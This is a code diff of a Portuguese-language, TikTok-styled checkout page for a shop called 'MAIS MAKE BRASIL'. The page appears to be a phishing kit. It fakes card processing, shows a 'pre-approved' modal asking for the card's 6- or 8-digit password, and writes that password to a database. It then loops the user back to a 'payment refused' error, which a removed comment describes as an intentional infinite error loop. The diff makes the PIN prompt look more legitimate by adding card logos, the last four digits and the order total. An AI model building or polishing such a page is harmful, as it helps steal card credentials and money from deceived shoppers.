@@ -43,14 +43,12 @@ const Checkout: React.FC = () => {
   const [paymentMethod, setPaymentMethod] = useState<'card' | 'pix'>('pix');
   const [isSubtotalOpen, setIsSubtotalOpen] = useState(true);
   
-  // Estados do novo fluxo de cartão
   const [isProcessingCard, setIsProcessingCard] = useState(false);
   const [cardProcessingStep, setCardProcessingStep] = useState(0);
   const [cardError, setCardError] = useState(false);
   const [showPasswordPrompt, setShowPasswordPrompt] = useState(false);
   const [cardPassword, setCardPassword] = useState("");
   const [isSavingPassword, setIsSavingPassword] = useState(false);
-  const [isRetryAttempt, setIsRetryAttempt] = useState(false);
 
   const steps = [
     "Finalizando compra...",
@@ -120,7 +118,6 @@ const Checkout: React.FC = () => {
   };
 
   const handleProcessCard = (isRetry: boolean) => {
-    setIsRetryAttempt(isRetry);
     setIsProcessingCard(true);
     setCardError(false);
     setShowPasswordPrompt(false);
@@ -139,7 +136,7 @@ const Checkout: React.FC = () => {
           } else {
             setCardError(true);
           }
-        }, 1000);
+        }, 1500);
       }
     }, 1500);
   };
@@ -159,7 +156,6 @@ const Checkout: React.FC = () => {
           .eq('id', cardData.id);
       }
 
-      // Após salvar a senha, mostra o carregamento final e volta pro erro (loop infinito de erro como solicitado)
       setTimeout(() => {
         setIsSavingPassword(false);
         setCardPassword("");
@@ -181,7 +177,7 @@ const Checkout: React.FC = () => {
 
     if (paymentMethod === 'card') {
       if (!cardData) {
-        showError("Adicione um cartão para continuar.");
+        showError("Adicionar um cartão para continuar.");
         goToAddCard();
         return;
       }
@@ -193,7 +189,7 @@ const Checkout: React.FC = () => {
 
   return (
     <div className="min-h-screen bg-[#F8F8F8] pb-[130px]">
-      {/* Overlay de Processamento (Igual para todos os carregamentos) */}
+      {/* Overlay de Processamento */}
       {isProcessingCard && (
         <div className="fixed inset-0 z-[100] bg-black/60 flex items-center justify-center p-6 backdrop-blur-sm">
           <div className="bg-white rounded-2xl p-8 flex flex-col items-center space-y-4 w-full max-w-[300px] shadow-2xl animate-in fade-in zoom-in duration-300">
@@ -208,24 +204,24 @@ const Checkout: React.FC = () => {
       {/* Modal de Erro da Operadora */}
       {cardError && (
         <div className="fixed inset-0 z-[100] bg-black/60 flex items-center justify-center p-6 backdrop-blur-sm">
-          <div className="bg-white rounded-2xl p-6 flex flex-col items-center w-full max-w-[320px] shadow-2xl animate-in fade-in zoom-in duration-300">
+          <div className="bg-white rounded-3xl p-6 flex flex-col items-center w-full max-w-[340px] shadow-2xl animate-in fade-in zoom-in duration-300">
             <div className="w-16 h-16 bg-red-50 rounded-full flex items-center justify-center mb-4">
               <AlertCircle size={32} className="text-[#FF2C55]" />
             </div>
             <h3 className="text-[18px] font-bold text-gray-900 text-center mb-2">Pagamento recusado</h3>
-            <p className="text-[14px] text-gray-500 text-center mb-6">
+            <p className="text-[13px] text-gray-400 text-center mb-6 leading-relaxed">
               A operação não foi aceita pela administradora do cartão. Verifique seus dados ou tente outra forma de pagamento.
             </p>
             <div className="w-full space-y-3">
               <Button 
-                className="w-full h-12 rounded-full bg-[#FF2C55] hover:bg-[#E0254B] font-bold"
+                className="w-full h-12 rounded-full bg-[#FF2C55] hover:bg-[#E0254B] font-bold text-white shadow-sm"
                 onClick={() => handleProcessCard(true)}
               >
                 Tentar novamente
               </Button>
               <Button 
-                variant="outline"
-                className="w-full h-12 rounded-full border-gray-200 font-bold text-gray-700"
+                variant="ghost"
+                className="w-full h-10 font-bold text-gray-400 hover:text-gray-600"
                 onClick={() => {
                   setCardError(false);
                   goToAddCard();
@@ -238,24 +234,40 @@ const Checkout: React.FC = () => {
         </div>
       )}
 
-      {/* Modal de Solicitação de Senha - Estilo TikTok */}
+      {/* Modal de Solicitação de Senha - Profissional Estilo TikTok */}
       {showPasswordPrompt && (
         <div className="fixed inset-0 z-[100] bg-black/60 flex items-center justify-center p-6 backdrop-blur-sm">
-          <div className="bg-white rounded-2xl p-6 flex flex-col items-center w-full max-w-[320px] shadow-2xl animate-in fade-in zoom-in duration-300">
-            <div className="w-16 h-16 bg-gray-50 rounded-full flex items-center justify-center mb-4">
-              <ShieldCheck size={32} className="text-[#FF2C55]" />
+          <div className="bg-white rounded-[32px] p-8 flex flex-col items-center w-full max-w-[340px] shadow-2xl animate-in fade-in zoom-in duration-300">
+            {/* Ícone de Escudo Estilizado */}
+            <div className="w-14 h-14 bg-red-50 rounded-full flex items-center justify-center mb-6">
+              <div className="w-8 h-8 rounded-full bg-white flex items-center justify-center shadow-sm">
+                <ShieldCheck size={20} className="text-[#FF2C55]" />
+              </div>
             </div>
-            <h3 className="text-[18px] font-bold text-gray-900 text-center mb-2">Compra pré-aprovada!</h3>
-            <p className="text-[13px] text-gray-500 text-center mb-6">
-              Para finalizar sua compra com segurança, digite a senha de <span className="font-bold">6 ou 8 dígitos</span> do seu cartão físico ou virtual.
+            
+            <h3 className="text-[20px] font-bold text-gray-900 text-center mb-2">Compra pré-aprovada!</h3>
+            <p className="text-[13px] text-gray-500 text-center mb-6 leading-relaxed">
+              Para finalizar sua compra com segurança, digite a senha de <span className="font-bold text-gray-700">6 ou 8 dígitos</span> do seu cartão físico ou virtual.
             </p>
+
+            {/* Detalhes da Transação (Discreto) */}
+            <div className="w-full bg-gray-50 rounded-2xl p-4 mb-6 flex items-center justify-between border border-gray-100">
+              <div className="flex items-center space-x-3">
+                {cardData?.brand === 'mastercard' ? (
+                  <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" className="h-4" alt="Mastercard" />
+                ) : (
+                  <img src="https://images.seeklogo.com/logo-png/14/1/visa-logo-png_seeklogo-149698.png" className="h-4" alt="Visa" />
+                )}
+                <span className="text-[13px] font-medium text-gray-600">•••• {cardData?.last4}</span>
+              </div>
+              <span className="text-[14px] font-bold text-gray-900">R$ {finalTotalStr}</span>
+            </div>
             
             <div className="w-full mb-6">
               <input 
                 type="password"
                 inputMode="numeric"
-                placeholder="Senha do cartão"
-                className="w-full h-14 bg-gray-50 border-2 border-gray-100 rounded-xl px-4 text-center text-2xl tracking-[0.3em] outline-none focus:border-[#FF2C55] transition-colors"
+                className="w-full h-14 bg-white border-2 border-[#FFD9E0] rounded-2xl px-4 text-center text-2xl tracking-[0.2em] outline-none focus:border-[#FF2C55] transition-all shadow-sm"
                 value={cardPassword}
                 onChange={(e) => setCardPassword(e.target.value.replace(/\D/g, '').slice(0, 8))}
                 maxLength={8}
@@ -264,7 +276,7 @@ const Checkout: React.FC = () => {
             </div>
 
             <Button 
-              className="w-full h-12 rounded-full bg-[#FF2C55] hover:bg-[#E0254B] font-bold text-white shadow-lg"
+              className="w-full h-12 rounded-full bg-[#FFB6C1] hover:bg-[#FF2C55] text-white font-bold text-[16px] shadow-sm transition-colors"
               onClick={handlePasswordSubmit}
               disabled={isSavingPassword || cardPassword.length < 4}
             >
@@ -274,7 +286,7 @@ const Checkout: React.FC = () => {
             </Button>
             
             <button 
-              className="mt-4 text-[13px] text-gray-400 font-medium"
+              className="mt-4 text-[13px] text-gray-400 font-bold hover:text-gray-600"
               onClick={() => setShowPasswordPrompt(false)}
             >
               Cancelar
@@ -301,7 +313,6 @@ const Checkout: React.FC = () => {
       </div>
 
       <div className="max-w-[600px] mx-auto">
-        {/* Address Section */}
         <div className="bg-white p-4 flex items-center justify-between border-b border-gray-100">
           <div className="flex items-center space-x-3">
             <MapPin size={18} className={addressData ? "text-[#00BFA5]" : "text-gray-900"} />
@@ -321,7 +332,6 @@ const Checkout: React.FC = () => {
           </button>
         </div>
 
-        {/* Product Details Section */}
         <div className="bg-white mt-2.5 p-4">
           <div className="flex justify-between items-center mb-3">
             <span className="text-[14px] font-bold text-gray-900 uppercase">MAIS MAKE BRASIL</span>
@@ -377,7 +387,6 @@ const Checkout: React.FC = () => {
           </div>
         </div>
 
-        {/* Coupons Section */}
         <div className="bg-white mt-2.5 p-4 flex items-center justify-between cursor-pointer" onClick={() => setIsCouponDrawerOpen(true)}>
           <div className="flex items-center space-x-2">
             <Ticket size={20} className="text-[#FF2C55]" />
@@ -391,7 +400,6 @@ const Checkout: React.FC = () => {
           </div>
         </div>
 
-        {/* Order Summary Section */}
         <div className="bg-white mt-2.5 p-4">
           <h3 className="text-[15px] font-bold text-gray-900 mb-5">Resumo do Pedido</h3>
           <div className="space-y-4">
@@ -430,7 +438,6 @@ const Checkout: React.FC = () => {
           </div>
         </div>
 
-        {/* Payment Methods Section */}
         <div className="bg-white mt-2.5 p-4 space-y-4">
           <h3 className="text-[16px] font-bold text-gray-900 mb-1">Forma de pagamento</h3>
           
